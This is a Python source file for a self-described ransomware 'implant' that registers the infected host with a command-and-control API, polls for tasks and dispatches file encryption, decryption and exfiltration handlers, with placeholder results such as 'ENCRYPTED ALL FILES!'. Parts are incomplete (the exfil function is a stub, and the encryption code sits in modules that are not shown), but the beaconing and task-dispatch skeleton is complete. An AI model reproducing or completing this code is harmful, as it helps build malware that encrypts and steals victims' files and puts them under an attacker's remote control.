import socket
import json
import os
from datetime import datetime
from api import api_get, api_post, api_put
from encrypt import encrypt
from decrypt import decrypt
from result import result

# Stores info on this device
info = {
    "ip": ''
}

tasks = []
results = [
    {
        "id": '1',
        "result_id": "abcd",
        "content": "ENCRYPTED ALL FILES!",
        "success": True
     },
    {
        "id": '2',
        "result_id": "abcde",
        "content": "Failed to encrypt files :(",
        "success": False
    }
]

# starts the implant
def start():
    global info
    
    info["ip"] = socket.gethostbyname('localhost')
    target_found = False
    
    # check if this target has connected previously
    targets = api_get('/targets')
    for target in targets:
        if (target['ip'] == info['ip']):  
            info = target
            target_found = True
            info = update_last_connect()
            break
    
    if not target_found:
        info = api_post('/targets', info)
    
    with open("meta.json", "w") as fd:
        fd.write(json.dumps(info))
    
    loop()

# Run every 30 seconds
# GET tasks
# execute tasks
# POST results
def loop():
    global info
    global results
    global tasks
    
    i = 0
    while(i < 2):
        print("RESULTS: ", results)
        res = api_post('/results', json.dumps(results))
        results = []
        
        tasks = res
        print(tasks)
        if tasks is not None:
            for task in tasks:
                print(task)
                task_type = task['task_type']
                if task_type == 'encrypt':
                    results.append(encrypt(task, info['target_id'], info['ip']))
                elif task_type == 'decrypt':
                    pass
                    results.append(decrypt(task, info))
                elif task_type == 'exfil':
                    pass
                    results.append(exfil(task))
                elif task_type == 'ping':
                    results.append(ping(task))
                else:
                    results.append(result(task['id'], task['task_id'], False, 'Invalid task_type'))
        i += 1


def update_last_connect():
    print('hello')
    info['last_connect'] = str(datetime.now())
    return api_put('/targets', info)

# TASK FUNCTIONS

def exfil(task):
    pass

def ping(task):
    return result(task['id'], task['task_id'], True, 'Pong!')

if __name__ == "__main__":
    start()